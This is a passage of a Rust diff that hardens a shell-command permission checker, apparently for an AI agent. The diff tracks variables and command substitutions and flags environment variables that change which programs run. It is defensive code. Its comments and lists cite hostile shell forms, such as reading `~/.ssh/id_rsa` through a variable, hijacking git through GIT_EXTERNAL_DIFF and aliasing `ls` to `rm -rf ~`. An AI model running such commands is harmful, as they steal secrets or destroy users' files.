@@ -1,4 +1,5 @@
 use crate::models::CommandRule;
+use crate::shell_lex::{is_name, lex_words, Part, Word};
 use globset::{Glob, GlobSet, GlobSetBuilder};
 use serde::Serialize;
 use std::collections::{HashMap, HashSet};
@@ -165,7 +166,7 @@ const READ_ONLY_PROGRAMS: &[&str] = &[
 /// keyword (`then cmd`, `do cmd`) is unwrapped and checked on its own.
 const SHELL_SYNTAX_WORDS: &[&str] = &[
     "do", "done", "then", "else", "elif", "fi", "esac", "{", "}", "for", "select", "case", "if",
-    "while", "until", "!",
+    "while", "until", "!", "function",
 ];
 
 const READ_ONLY_GIT_SUBCOMMANDS: &[&str] = &[
@@ -268,6 +269,49 @@ const STDIN_SCRIPT_PROGRAMS: &[&str] = &[
     "nodejs", "deno", "bun", "ruby", "perl", "php", "lua", "osascript", "Rscript", "cmd",
     "powershell", "pwsh", "ssh",
 ];
+
+/// Programs whose arguments are text they print or compare, never files they
+/// open, so a value the shell expands into them reaches no file. Their
+/// redirections are still path-checked.
+const DATA_ONLY_PROGRAMS: &[&str] = &[
+    "echo", "printf", "true", "false", ":", "sleep", "seq", "basename", "dirname", "test", "[",
+    "[[", "set", "unset", "export", "declare", "typeset", "local", "readonly", "read", "shift",
+    "return", "exit", "wait", "for", "select", "case", "done", "fi", "esac", "}",
+];
+
+/// Variables that decide which programs run or what they do. Setting one lets
+/// a later, harmless-looking command run anything (`GIT_EXTERNAL_DIFF=… git
+/// diff`, `PS4='$(…)'` with `set -x`), so it always asks. `PATH` is judged by
+/// the directories it adds instead.
+const CODE_VARIABLES: &[&str] = &[
+    "IFS", "PS0", "PS1", "PS2", "PS4", "PROMPT_COMMAND", "BASH_ENV", "ENV", "CDPATH", "HOME",
+    "SHELL", "SHELLOPTS", "BASHOPTS", "PAGER", "MANPAGER", "EDITOR", "VISUAL", "BROWSER",
+    "SSH_ASKPASS", "SUDO_ASKPASS", "LESSOPEN", "LESSCLOSE", "NODE_OPTIONS", "NODE_PATH",
+    "PYTHONPATH", "PYTHONSTARTUP", "PYTHONHOME", "PYTHONINSPECT", "PERL5OPT", "PERL5LIB",
+    "PERLLIB", "RUBYOPT", "RUBYLIB", "JAVA_TOOL_OPTIONS", "_JAVA_OPTIONS", "JDK_JAVA_OPTIONS",
+    "CLASSPATH", "RUSTC", "RUSTC_WRAPPER", "RUSTC_WORKSPACE_WRAPPER", "RUSTDOC",
+    "CARGO_BUILD_RUSTC", "CARGO_BUILD_RUSTC_WRAPPER", "CC", "CXX", "LD", "AR", "MAKE",
+    "MAKEFLAGS", "MAKESHELL", "http_proxy", "https_proxy", "HTTP_PROXY", "HTTPS_PROXY",
+    "ALL_PROXY", "all_proxy", "CURL_HOME", "WGETRC", "SSL_CERT_FILE", "SSL_CERT_DIR",
+    "CURL_CA_BUNDLE", "REQUESTS_CA_BUNDLE", "NODE_EXTRA_CA_CERTS", "GIT_SSH", "GIT_SSH_COMMAND",
+    "GIT_EXTERNAL_DIFF", "GIT_PAGER", "GIT_EDITOR", "GIT_SEQUENCE_EDITOR", "GIT_ASKPASS",
+    "GIT_EXEC_PATH", "GIT_TEMPLATE_DIR", "GIT_DIR", "GIT_WORK_TREE", "GIT_PROXY_COMMAND",
+];
+
+/// Prefixes of variable families that load code or configuration (dynamic
+/// linker settings, exported bash functions, git and npm configuration).
+const CODE_VARIABLE_PREFIXES: &[&str] =
+    &["LD_", "DYLD_", "BASH_FUNC_", "GIT_CONFIG", "npm_config_", "NPM_CONFIG_"];
+
+/// Marks a path argument whose value the shell only computes at run time.
+/// The text after it is the word as written, for the prompt.
+const UNKNOWN_PATH: char = '\u{E000}';
+
+/// How deeply command substitutions are followed before a line asks.
+const MAX_SUBSTITUTION_DEPTH: usize = 4;
+
+/// Most values tracked for one variable or one expanded word.
+const MAX_TRACKED_VALUES: usize = 32;
 
 /// One shell segment of a compound command, tagged with whether it was
 /// auto-allowed. Streamed to the permission overlay so the user can see which
@@ -750,6 +794,87 @@ struct EvalContext<'a> {
 /// (`cd "$DIR"`); relative paths then count as outside the project.
 type Base = Option<PathBuf>;
 
+/// The variables a command line has assigned so far, so later segments can be
+/// judged by what the shell will really expand (`P=~/.ssh/id_rsa; cat $P` is
+/// `cat ~/.ssh/id_rsa`). A variable the line never assigned has the value the
+/// shell inherits from pumr, which is also what the command runs with.
+#[derive(Debug, Clone, Default)]
+struct ShellState {
+    /// Every value a variable may hold; `None` when it cannot be known.
+    variables: HashMap<String, Option<Vec<String>>>,
+    /// Set once something could have assigned any variable (`eval`, `source`,
+    /// a program named at run time): nothing is known from then on.
+    opaque: bool,
+}
+
+impl ShellState {
+    fn values(&self, name: &str, bases: &[Base]) -> Option<Vec<String>> {
+        if self.opaque {
+            return None;
+        }
+        if let Some(values) = self.variables.get(name) {
+            return values.clone();
+        }
+        match name {
+            // The shell sets `PWD` to the directory it starts in.
+            "PWD" => bases
+                .iter()
+                .map(|base| base.as_ref().map(|path| path.display().to_string()))
+                .collect(),
+            "OLDPWD" => None,
+            _ => match std::env::var_os(name) {
+                None => Some(vec![String::new()]),
+                Some(value) => value.into_string().ok().map(|value| vec![value]),
+            },
+        }
+    }
+
+    /// Records an assignment. One that may not run (in a subshell, after
+    /// `&&`, inside a loop body) only adds its values to the old ones.
+    fn assign(&mut self, name: &str, values: Option<Vec<String>>, certain: bool, bases: &[Base]) {
+        let merged = if certain {
+            values.filter(|values| values.len() <= MAX_TRACKED_VALUES)
+        } else {
+            match (self.values(name, bases), values) {
+                (Some(mut known), Some(new)) => {
+                    for value in new {
+                        if !known.contains(&value) {
+                            known.push(value);
+                        }
+                    }
+                    (known.len() <= MAX_TRACKED_VALUES).then_some(known)
+                }
+                _ => None,
+            }
+        };
+        self.variables.insert(name.to_string(), merged);
+    }
+}
+
+/// One shell segment of a command line and how it runs relative to the
+/// line's own shell: in a subshell (`depth`), only if an earlier part
+/// succeeded or failed or as a pipeline stage (`conditional`), or in a forked
+/// process that cannot change the shell (`forked`).
+#[derive(Debug, Clone, PartialEq, Eq, Default)]
+struct Segment {
+    text: String,
+    depth: usize,
+    conditional: bool,
+    forked: bool,
+}
+
+/// What separates two segments.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum Separator {
+    Sequence,
+    And,
+    Or,
+    Pipe,
+    Background,
+    Open,
+    Close,
+}
+
 /// Convenience wrapper over [`evaluate_command_with`] using the legacy default
 /// automatic-approval policy. Kept for callers and tests that do not thread the
 /// live settings.
@@ -822,9 +947,43 @@ pub fn evaluate_command_full(
         websites,
         probing: false,
     };
+    evaluate_line(
+        command,
+        &context,
+        vec![Some(normalize(cwd))],
+        ShellState::default(),
+        0,
+        trace,
+    )
+}
+
+/// Decides a whole command line, or the body of a command substitution.
+/// `bases` and `state` are the directories and variables it starts with; a
+/// substitution inherits them from the line it runs in, and `depth` counts
+/// how deeply it is nested.
+fn evaluate_line(
+    command: &str,
+    context: &EvalContext<'_>,
+    mut bases: Vec<Base>,
+    mut state: ShellState,
+    depth: usize,
+    trace: &mut Vec<String>,
+) -> CommandDecision {
+    let rules = context.rules;
     let trimmed = command.trim();
     if trimmed.is_empty() {
         return CommandDecision::Allow;
+    }
+    if depth > MAX_SUBSTITUTION_DEPTH {
+        return ask_scoped(
+            "Command substitutions are nested too deeply to check".to_string(),
+            whole_line_rule(trimmed),
+            CommandRisk::new(
+                CommandRiskLevel::High,
+                "Deeply nested command substitutions cannot be verified.",
+            ),
+            whole_line_options(trimmed),
+        );
     }
 
     // The raw line is handed to `sh -c` / `cmd /C`, so it is evaluated one
@@ -840,7 +999,7 @@ pub fn evaluate_command_full(
     // mistaken for separate shell commands. The `<<DELIM` operator stays on the
     // command line, so the evaluator still sees which program receives it.
     let blanked = blank_comments(&blank_heredoc_bodies(trimmed));
-    let Some(segments) = split_segments(&blanked) else {
+    let Some(segments) = split_segment_parts(&blanked) else {
         // The line cannot be split safely, so its only rememberable scope is the
         // whole command. An explicit, identical exact rule lets "allow in this
         // chat"/"allow always" stop the same line from asking again.
@@ -858,9 +1017,17 @@ pub fn evaluate_command_full(
             whole_line_options(trimmed),
         );
     };
-    let mut bases: Vec<Base> = vec![Some(normalize(cwd))];
     if segments.len() == 1 {
-        return evaluate_segment(&segments[0], &context, &bases, trace);
+        let words = lex_words(&segments[0].text).ok();
+        return evaluate_segment(
+            &segments[0].text,
+            words.as_deref(),
+            context,
+            &bases,
+            &state,
+            depth,
+            trace,
+        );
     }
     // Evaluate every segment so the prompt can show which parts are already
     // allowed, and keep the highest-risk asking segment's reason, rule, risk
@@ -877,11 +1044,34 @@ pub fn evaluate_command_full(
     // line.
     let mut all_folders: Vec<String> = Vec::new();
     let mut all_hosts: Vec<String> = Vec::new();
+    // Open `if`/`for`/`while`/`case`/`{` blocks: what runs inside one may run
+    // any number of times, including never.
+    let mut blocks = 0usize;
     for segment in &segments {
-        let decision = evaluate_segment(segment, &context, &bases, trace);
+        let words = lex_words(&segment.text).ok();
+        let decision = evaluate_segment(
+            &segment.text,
+            words.as_deref(),
+            context,
+            &bases,
+            &state,
+            depth,
+            trace,
+        );
         // A `cd` moves every later segment, so they resolve relative paths
         // against the directories it may have moved to as well.
-        track_directory_change(segment, &mut bases);
+        track_directory_change(&segment.text, &mut bases);
+        // Variables it assigns are what later segments expand.
+        match &words {
+            Some(words) => {
+                let inside_block = track_blocks(words, &mut blocks);
+                let certain =
+                    segment.depth == 0 && !segment.conditional && !segment.forked && !inside_block;
+                track_variables(words, certain, &mut state, &bases);
+            }
+            None => state.opaque = true,
+        }
+        let segment = &segment.text;
         match decision {
             CommandDecision::Deny { reason } => return CommandDecision::Deny { reason },
             CommandDecision::Allow => {
@@ -1092,6 +1282,14 @@ fn unwrap_command(tokens: &[String]) -> Option<Vec<String>> {
             // A keyword that introduces a command (`then sudo x`, `do kill 1`):
             // the command after it is what runs.
             "do" | "then" | "else" | "elif" | "if" | "while" | "until" | "!" | "{" => index += 1,
+            // `function name { cmd …`: the body is judged like the commands
+            // it runs when the function is called.
+            "function" if tokens.len() > index + 2 => {
+                index += 2;
+                if tokens.get(index).is_some_and(|token| token == "{") {
+                    index += 1;
+                }
+            }
             "time" => {
                 index += 1;
                 while tokens.get(index).is_some_and(|token| token == "-p") {
@@ -1161,10 +1359,17 @@ fn unwrap_command(tokens: &[String]) -> Option<Vec<String>> {
 
 /// Classifies a single shell segment: no `;`, `&&`, `|` or newline is left in
 /// it, so at most one program runs and the usual program/path checks apply.
+///
+/// `words` is the segment lexed with its expansions marked (`None` when it
+/// could not be lexed); `state` holds the variables earlier segments of the
+/// line assigned.
 fn evaluate_segment(
     segment: &str,
+    words: Option<&[Word]>,
     context: &EvalContext<'_>,
     bases: &[Base],
+    state: &ShellState,
+    depth: usize,
     trace: &mut Vec<String>,
 ) -> CommandDecision {
     let project_root = context.project_root;
@@ -1235,6 +1440,62 @@ fn evaluate_segment(
         return CommandDecision::Deny {
             reason: format!("Command '{program}' is on the deny list"),
         };
+    }
+    // The shell expands parameters, command substitutions and brace lists
+    // before the program runs, and the tokens above keep them as written.
+    // What they produce is checked below; what cannot be known asks.
+    let Some(words) = words else {
+        if matches_exact_rule(trimmed, rules) {
+            trace.push("matches an exact allow rule".to_string());
+            return CommandDecision::Allow;
+        }
+        return ask_scoped(
+            "Command could not be analyzed and needs review".to_string(),
+            suggest_rule(trimmed, &program),
+            CommandRisk::new(
+                CommandRiskLevel::High,
+                "The shell syntax could not be analyzed, so its effects cannot be verified.",
+            ),
+            whole_line_options(trimmed),
+        );
+    };
+    let lexed_program = program_word(words);
+    if let Some(decision) =
+        check_substitutions(words, trimmed, &program, context, bases, state, depth)
+    {
+        return decision;
+    }
+    let exact = matches_exact_rule(trimmed, rules);
+    if let Some(index) = lexed_program.filter(|&index| words[index].is_dynamic()) {
+        if !exact {
+            return ask_scoped(
+                format!(
+                    "The program to run is only known when the command runs: {}",
+                    words[index].raw
+                ),
+                suggest_rule(trimmed, &program),
+                CommandRisk::new(
+                    CommandRiskLevel::High,
+                    "The shell builds the program name at run time, so it cannot be checked.",
+                ),
+                whole_line_options(trimmed),
+            );
+        }
+    }
+    if let Some(name) = code_variable_assignment(words, lexed_program, context, bases, state) {
+        if !exact {
+            return ask_scoped(
+                format!("Command sets {name}, which changes which programs run or what they do"),
+                suggest_rule(trimmed, &program),
+                CommandRisk::new(
+                    CommandRiskLevel::High,
+                    format!(
+                        "With {name} changed, a harmless-looking command can run other programs."
+                    ),
+                ),
+                whole_line_options(trimmed),
+            );
+        }
     }
     // Hosts a network command contacts. A host on the website deny list denies
     // the command like a deny rule; hosts not allowed yet are asked about below.
@@ -1312,7 +1573,24 @@ fn evaluate_segment(
         }
     }
 
-    let path_tokens = candidate_paths(&tokens, dangerous, bases);
+    let mut path_tokens = candidate_paths(&tokens, dangerous, bases);
+    // Paths that come from expansions, resolved through the line's variables;
+    // values only known at run time are collected separately and ask below.
+    let mut unresolved: Vec<String> = Vec::new();
+    for token in expansion_path_tokens(words, lexed_program, dangerous, state, bases) {
+        match token.split_once(UNKNOWN_PATH) {
+            Some((_, shown)) => {
+                if !unresolved.iter().any(|entry| entry == shown) {
+                    unresolved.push(shown.to_string());
+                }
+            }
+            None => {
+                if !path_tokens.contains(&token) {
+                    path_tokens.push(token);
+                }
+            }
+        }
+    }
     let mut outside: Vec<String> = Vec::new();
     // Where each outside token really points: the resolved path, or the real
     // location behind a symlink that leads out of the project.
@@ -1420,7 +1698,15 @@ fn evaluate_segment(
                 probing: true,
                 ..*context
             };
-            match evaluate_segment(segment, &probe, bases, &mut Vec::new()) {
+            match evaluate_segment(
+                segment,
+                Some(words),
+                &probe,
+                bases,
+                state,
+                depth,
+                &mut Vec::new(),
+            ) {
                 CommandDecision::Ask {
                     scope_options,
                     hosts,
@@ -1466,6 +1752,33 @@ fn evaluate_segment(
                 ),
             ),
             Vec::new(),
+        );
+    }
+    // A value the shell only computes at run time (`cat $(…)`, a variable
+    // read from input, a brace list) could name any file, so no saved rule
+    // covers it: only this exact line can be remembered.
+    if !unresolved.is_empty() && !exact {
+        let (level, detail) = match danger.as_deref() {
+            Some(reason) => (
+                danger_risk_level(&program, reason),
+                format!(
+                    "{reason}. It also passes values the shell only computes at run time, so the files it touches cannot be checked."
+                ),
+            ),
+            None => (
+                CommandRiskLevel::Medium,
+                "It passes values the shell only computes at run time, so the files it touches cannot be checked."
+                    .to_string(),
+            ),
+        };
+        return ask_scoped(
+            format!(
+                "Command uses values that are only known when it runs: {}",
+                preview(&unresolved)
+            ),
+            suggested_rule,
+            CommandRisk::new(level, detail),
+            whole_line_options(trimmed),
         );
     }
 
@@ -1612,7 +1925,15 @@ fn evaluate_segment(
                     probing: true,
                     ..*context
                 };
-                match evaluate_segment(segment, &probe, bases, &mut Vec::new()) {
+                match evaluate_segment(
+                    segment,
+                    Some(words),
+                    &probe,
+                    bases,
+                    state,
+                    depth,
+                    &mut Vec::new(),
+                ) {
                     CommandDecision::Ask { scope_options, .. } => scope_options,
                     _ => Vec::new(),
                 }
@@ -1658,6 +1979,12 @@ fn evaluate_segment(
             .is_some_and(|argument| argument.starts_with('-') || argument.starts_with('+'));
     if SHELL_SYNTAX_WORDS.contains(&program.as_str()) || options_only {
         trace.push("shell syntax that runs no program".to_string());
+        return CommandDecision::Allow;
+    }
+    // `NAME=value` alone runs nothing: the value is checked where it is used,
+    // and substitutions in it and code-changing variables were judged above.
+    if lexed_program.is_none() && words.iter().all(|word| word.assignment().is_some()) {
+        trace.push("only assigns shell variables".to_string());
         return CommandDecision::Allow;
     }
     // Code the checks above cannot see: inline interpreter code, `eval`,
@@ -1720,6 +2047,487 @@ fn evaluate_segment(
         risk,
         scope_options,
     )
+}
+
+/// Index of the word that names the program: after assignments, redirections
+/// written before it (`>out cmd`) and wrappers (`env`, `nohup`, …). `None`
+/// when the segment only assigns variables or a wrapper cannot be followed.
+fn program_word(words: &[Word]) -> Option<usize> {
+    let mut first = 0;
+    while let Some(word) = words.get(first) {
+        if word.assignment().is_some() {
+            first += 1;
+        } else if let Some(text) = word.literal() {
+            match parse_redirect(&text) {
+                Some(Redirect::Bare) => first += 2,
+                Some(_) => first += 1,
+                None => break,
+            }
+        } else if redirect_prefix(word).is_some() {
+            first += 1;
+        } else {
+            break;
+        }
+    }
+    if first >= words.len() {
+        return None;
+    }
+    let views: Vec<String> = words[first..].iter().map(word_view).collect();
+    let rest = unwrap_command(&views)?;
+    Some(words.len() - rest.len())
+}
+
+/// How a word looks to [`unwrap_command`]: its literal text, with anything the
+/// shell only knows at run time replaced by [`UNKNOWN_PATH`].
+fn word_view(word: &Word) -> String {
+    if let Some(text) = word.literal() {
+        return text;
+    }
+    match word.assignment() {
+        Some(assignment) => format!("{}={UNKNOWN_PATH}", assignment.name),
+        None => UNKNOWN_PATH.to_string(),
+    }
+}
+
+/// The redirection operator a word starts with when its target is written
+/// right after it (`>out`, `2>>log`, `&>$LOG`); `None` for other words,
+/// heredocs and descriptor duplications.
+fn redirect_prefix(word: &Word) -> Option<String> {
+    let Some(Part::Text(first)) = word.parts.first() else {
+        return None;
+    };
+    let rest = first.trim_start_matches(|character: char| character.is_ascii_digit());
+    let rest = if rest.len() == first.len() {
+        rest.strip_prefix('&').unwrap_or(rest)
+    } else {
+        rest
+    };
+    if rest.starts_with("<<") {
+        return None;
+    }
+    let operator = [">>", ">|", ">", "<"]
+        .into_iter()
+        .find(|operator| rest.starts_with(operator))?;
+    let length = first.len() - rest.len() + operator.len();
+    if first[length..].starts_with('&') {
+        return None;
+    }
+    Some(first[..length].to_string())
+}
+
+/// Judges the commands inside `$(…)` and backticks like any other command
+/// line: they run before the segment does, in its directory and with its
+/// variables, and their output can end up anywhere in it. `None` when they
+/// are all allowed (or the user allowed this exact line).
+fn check_substitutions(
+    words: &[Word],
+    trimmed: &str,
+    program: &str,
+    context: &EvalContext<'_>,
+    bases: &[Base],
+    state: &ShellState,
+    depth: usize,
+) -> Option<CommandDecision> {
+    for body in words.iter().flat_map(|word| word.substitutions.iter()) {
+        match evaluate_line(
+            body,
+            context,
+            bases.to_vec(),
+            state.clone(),
+            depth + 1,
+            &mut Vec::new(),
+        ) {
+            CommandDecision::Allow => {}
+            CommandDecision::Deny { reason } => return Some(CommandDecision::Deny { reason }),
+            CommandDecision::Ask {
+                reason,
+                risk,
+                outside_folders,
+                hosts,
+                ..
+            } => {
+                if matches_exact_rule(trimmed, context.rules) {
+                    continue;
+                }
+                return Some(CommandDecision::Ask {
+                    reason: format!("A command substitution needs approval: {reason}"),
+                    suggested_rule: suggest_rule(trimmed, program),
+                    segments: Vec::new(),
+                    risk,
+                    scope_options: whole_line_options(trimmed),
+                    outside_folders,
+                    hosts,
+                });
+            }
+        }
+    }
+    None
+}
+
+/// The first variable the segment sets that changes which programs run or
+/// what they do ([`CODE_VARIABLES`]). `PATH` only counts when it gains a
+/// directory that is relative or one the agent can write to (the project or
+/// a granted folder), where a file could stand in for a trusted program.
+fn code_variable_assignment(
+    words: &[Word],
+    program: Option<usize>,
+    context: &EvalContext<'_>,
+    bases: &[Base],
+    state: &ShellState,
+) -> Option<String> {
+    assigned_variables(words, program)
+        .into_iter()
+        .find_map(|(name, value)| {
+            let risky = if name == "PATH" {
+                !value.is_some_and(|value| trusted_path_value(&value, context, bases, state))
+            } else {
+                CODE_VARIABLES.contains(&name.as_str())
+                    || CODE_VARIABLE_PREFIXES
+                        .iter()
+                        .any(|prefix| name.starts_with(prefix))
+            };
+            risky.then_some(name)
+        })
+}
+
+/// The variables a segment sets, with their value when it is written in the
+/// command: `NAME=value` before the program or alone, `export`-style
+/// declarations, and names filled in at run time (`read`, `for`, `printf -v`).
+fn assigned_variables(words: &[Word], program: Option<usize>) -> Vec<(String, Option<Vec<Part>>)> {
+    let mut assigned: Vec<(String, Option<Vec<Part>>)> = words[..program.unwrap_or(words.len())]
+        .iter()
+        .filter_map(Word::assignment)
+        .map(|assignment| (assignment.name, Some(assignment.value)))
+        .collect();
+    let Some(index) = program else {
+        return assigned;
+    };
+    let arguments = &words[index + 1..];
+    let names = |words: &[Word]| -> Vec<String> {
+        words
+            .iter()
+            .filter_map(Word::literal)
+            .filter(|name| is_name(name))
+            .collect()
+    };
+    match words[index].literal().map(|name| base_name(&name)).as_deref() {
+        Some("export" | "declare" | "typeset" | "local" | "readonly") => {
+            for assignment in arguments.iter().filter_map(Word::assignment) {
+                assigned.push((assignment.name, Some(assignment.value)));
+            }
+        }
+        Some("read" | "getopts" | "mapfile" | "readarray") => {
+            assigned.extend(names(arguments).into_iter().map(|name| (name, None)));
+        }
+        Some("for" | "select") => {
+            assigned.extend(names(&arguments[..arguments.len().min(1)]).into_iter().map(|name| (name, None)));
+        }
+        Some("printf") => {
+            if let Some(position) = arguments
+                .iter()
+                .position(|word| word.literal().as_deref() == Some("-v"))
+            {
+                assigned.extend(
+                    names(&arguments[position + 1..(position + 2).min(arguments.len())])
+                        .into_iter()
+                        .map(|name| (name, None)),
+                );
+            }
+        }
+        _ => {}
+    }
+    assigned
+}
+
+/// Whether every directory a `PATH` value lists is absolute and outside the
+/// project and its granted folders: `$HOME/.cargo/bin:$PATH` is, while
+/// `.:$PATH` or `node_modules/.bin:$PATH` is not.
+fn trusted_path_value(
+    value: &[Part],
+    context: &EvalContext<'_>,
+    bases: &[Base],
+    state: &ShellState,
+) -> bool {
+    let Some(values) = expand_parts(value, false, state, bases) else {
+        return false;
+    };
+    values.iter().all(|value| {
+        value.split(':').all(|entry| {
+            // An empty entry is the current directory.
+            if entry.is_empty() {
+                return false;
+            }
+            let directory = if entry.starts_with('~') {
+                resolve_path(Path::new("/"), entry)
+            } else {
+                normalize(Path::new(entry))
+            };
+            directory.is_absolute()
+                && !path_is_inside(&directory, context.project_root, context.extra_folders)
+        })
+    })
+}
+
+/// Every text `parts` can expand to through the line's variables, or `None`
+/// when a part is only known at run time. With `split`, unquoted values are
+/// split into words like the shell does, so an unquoted expansion that is
+/// empty disappears.
+fn expand_parts(
+    parts: &[Part],
+    split: bool,
+    state: &ShellState,
+    bases: &[Base],
+) -> Option<Vec<String>> {
+    // Each candidate text, and whether an unquoted variable went into it.
+    let mut candidates: Vec<(String, bool)> = vec![(String::new(), false)];
+    for part in parts {
+        match part {
+            Part::Text(text) => {
+                for (value, _) in &mut candidates {
+                    value.push_str(text);
+                }
+            }
+            Part::Variable { name, quoted } => {
+                let values = state.values(name, bases)?;
+                let mut next = Vec::with_capacity(candidates.len() * values.len());
+                for (prefix, unquoted) in &candidates {
+                    for value in &values {
+                        next.push((format!("{prefix}{value}"), *unquoted || !quoted));
+                    }
+                }
+                if next.len() > MAX_TRACKED_VALUES {
+                    return None;
+                }
+                candidates = next;
+            }
+            Part::Dynamic => return None,
+        }
+    }
+    let mut words = Vec::new();
+    for (value, unquoted) in candidates {
+        if split && unquoted {
+            words.extend(value.split_whitespace().map(str::to_string));
+        } else {
+            words.push(value);
+        }
+    }
+    (words.len() <= MAX_TRACKED_VALUES).then_some(words)
+}
+
+/// The words a shell word becomes once expanded, or `None` when that is only
+/// known at run time (including brace lists).
+fn expand_word(word: &Word, state: &ShellState, bases: &[Base]) -> Option<Vec<String>> {
+    if word.brace {
+        return None;
+    }
+    expand_parts(&word.parts, true, state, bases)
+}
+
+/// Path candidates of the segment as the shell will see them: from the lexed
+/// words (which decode `$'…'` and keep substitutions whole, unlike the plain
+/// tokens), with the line's variables substituted. A value only known at run
+/// time becomes an [`UNKNOWN_PATH`] token carrying the word as written. The
+/// expanded arguments of [`DATA_ONLY_PROGRAMS`] are skipped; their
+/// redirections are not.
+fn expansion_path_tokens(
+    words: &[Word],
+    program: Option<usize>,
+    dangerous: bool,
+    state: &ShellState,
+    bases: &[Base],
+) -> Vec<String> {
+    let program_name = program.and_then(|index| words[index].literal());
+    let data_only = program_name
+        .as_deref()
+        .is_some_and(|name| DATA_ONLY_PROGRAMS.contains(&base_name(name).as_str()));
+    // The program comes first, as `candidate_paths` expects; words written
+    // before it only matter as redirections (`>out cmd`).
+    let mut tokens = vec![program_name.unwrap_or_default()];
+    let order: Vec<usize> = match program {
+        Some(index) => (index + 1..words.len()).chain(0..index).collect(),
+        None => (0..words.len()).collect(),
+    };
+    for index in order {
+        let word = &words[index];
+        // `NAME=value` before the program only sets its environment.
+        if word.assignment().is_some() && program.is_none_or(|program| index < program) {
+            continue;
+        }
+        if let Some(text) = word.literal() {
+            tokens.push(text);
+            continue;
+        }
+        let redirect_target = index > 0
+            && words[index - 1]
+                .literal()
+                .is_some_and(|previous| parse_redirect(&previous) == Some(Redirect::Bare));
+        let prefix = redirect_prefix(word);
+        if data_only && !redirect_target && prefix.is_none() {
+            continue;
+        }
+        match expand_word(word, state, bases) {
+            Some(values) => tokens.extend(values),
+            None => tokens.push(format!(
+                "{}{UNKNOWN_PATH}{}",
+                prefix.unwrap_or_default(),
+                word.raw
+            )),
+        }
+    }
+    candidate_paths(&tokens, dangerous, bases)
+}
+
+/// Words that introduce or close a block rather than run a program.
+fn is_block_keyword(word: &Word) -> bool {
+    matches!(
+        word.literal().as_deref(),
+        Some("then" | "do" | "else" | "elif" | "if" | "while" | "until" | "!" | "{" | "time")
+    )
+}
+
+/// Follows `if`/`for`/`while`/`until`/`case`/`{` blocks across segments and
+/// returns whether this segment's command runs inside one, where it may run
+/// any number of times or not at all.
+fn track_blocks(words: &[Word], blocks: &mut usize) -> bool {
+    let mut inside = *blocks > 0;
+    for word in words {
+        match word.literal().as_deref() {
+            // A loop or `case` header runs once, where its block starts.
+            Some("for" | "select" | "case") => {
+                *blocks += 1;
+                break;
+            }
+            Some("if" | "while" | "until" | "{") => {
+                *blocks += 1;
+                inside = true;
+            }
+            Some("then" | "do" | "else" | "elif" | "!") => inside = true,
+            Some("fi" | "done" | "esac" | "}") => *blocks = blocks.saturating_sub(1),
+            _ => break,
+        }
+    }
+    inside
+}
+
+/// Records the variables a segment assigns for the segments after it.
+/// `certain` says whether the segment always runs in the line's own shell;
+/// otherwise a value joins the earlier ones instead of replacing them.
+fn track_variables(words: &[Word], certain: bool, state: &mut ShellState, bases: &[Base]) {
+    let keywords = words.iter().take_while(|word| is_block_keyword(word)).count();
+    let words = &words[keywords..];
+    let assignment_values = |assignment: &crate::shell_lex::Assignment, state: &ShellState| {
+        // `NAME+=value` appends to a value this does not model.
+        (!assignment.append)
+            .then(|| expand_parts(&assignment.value, false, state, bases))
+            .flatten()
+    };
+    let Some(index) = program_word(words) else {
+        // Only assignments (and redirections) set the shell's own variables.
+        let assigns_only = words.iter().enumerate().all(|(position, word)| {
+            word.assignment().is_some()
+                || redirect_prefix(word).is_some()
+                || word
+                    .literal()
+                    .is_some_and(|text| parse_redirect(&text).is_some())
+                || (position > 0
+                    && words[position - 1]
+                        .literal()
+                        .is_some_and(|text| parse_redirect(&text) == Some(Redirect::Bare)))
+        });
+        if !assigns_only {
+            state.opaque = true;
+            return;
+        }
+        for assignment in words.iter().filter_map(Word::assignment) {
+            let values = assignment_values(&assignment, state);
+            state.assign(&assignment.name, values, certain, bases);
+        }
+        return;
+    };
+    let arguments = &words[index + 1..];
+    match words[index].literal().map(|name| base_name(&name)).as_deref() {
+        Some("export" | "declare" | "typeset" | "local" | "readonly") => {
+            for word in arguments {
+                if let Some(flags) = word.literal().filter(|text| text.starts_with('-')) {
+                    // `-n` makes the name refer to another variable.
+                    if !flags.starts_with("--") && flags.contains('n') {
+                        state.opaque = true;
+                    }
+                    continue;
+                }
+                match word.assignment() {
+                    Some(assignment) => {
+                        let values = assignment_values(&assignment, state);
+                        state.assign(&assignment.name, values, certain, bases);
+                    }
+                    None if word.literal().is_some() => {}
+                    None => state.opaque = true,
+                }
+            }
+        }
+        Some("unset") => {
+            for name in arguments
+                .iter()
+                .filter_map(Word::literal)
+                .filter(|name| is_name(name))
+            {
+                state.assign(&name, Some(vec![String::new()]), certain, bases);
+            }
+        }
+        Some("for" | "select") => {
+            let Some(name) = arguments
+                .first()
+                .and_then(Word::literal)
+                .filter(|name| is_name(name))
+            else {
+                return;
+            };
+            let values = match arguments.get(1).and_then(Word::literal).as_deref() {
+                Some("in") => arguments[2..]
+                    .iter()
+                    .map(|word| expand_word(word, state, bases))
+                    .collect::<Option<Vec<Vec<String>>>>()
+                    .map(|lists| lists.concat()),
+                // Without `in` the loop runs over the positional parameters.
+                _ => None,
+            };
+            // The body sees one of the listed values; an empty list never
+            // runs it and leaves the variable as it was.
+            let replace = certain && values.as_ref().is_some_and(|values| !values.is_empty());
+            state.assign(&name, values, replace, bases);
+        }
+        Some("read" | "getopts" | "mapfile" | "readarray") => {
+            let names: Vec<String> = arguments
+                .iter()
+                .filter_map(Word::literal)
+                .filter(|name| is_name(name))
+                .collect();
+            if names.is_empty() {
+                state.assign("REPLY", None, true, bases);
+                state.assign("MAPFILE", None, true, bases);
+            }
+            for name in names {
+                state.assign(&name, None, true, bases);
+            }
+            if arguments.iter().any(Word::is_dynamic) {
+                state.opaque = true;
+            }
+        }
+        Some("printf") => {
+            if let Some(position) = arguments
+                .iter()
+                .position(|word| word.literal().as_deref() == Some("-v"))
+            {
+                match arguments.get(position + 1).and_then(Word::literal) {
+                    Some(name) if is_name(&name) => state.assign(&name, None, true, bases),
+                    _ => state.opaque = true,
+                }
+            }
+        }
+        // These can assign any variable, as can a program named at run time.
+        Some("let" | "eval" | "source" | "." | "exec") | None => state.opaque = true,
+        _ => {}
+    }
 }
 
 /// Every place a path token may point to, one per base directory. `None` when
@@ -2009,6 +2817,37 @@ fn nested_code(program: &str, tokens: &[String]) -> Option<NestedCode> {
             detail: "Git configuration can name programs to run, such as a pager or an editor.",
             exact_only: true,
         }),
+        // `alias ls='rm -rf ~'` turns a later, harmless-looking command into
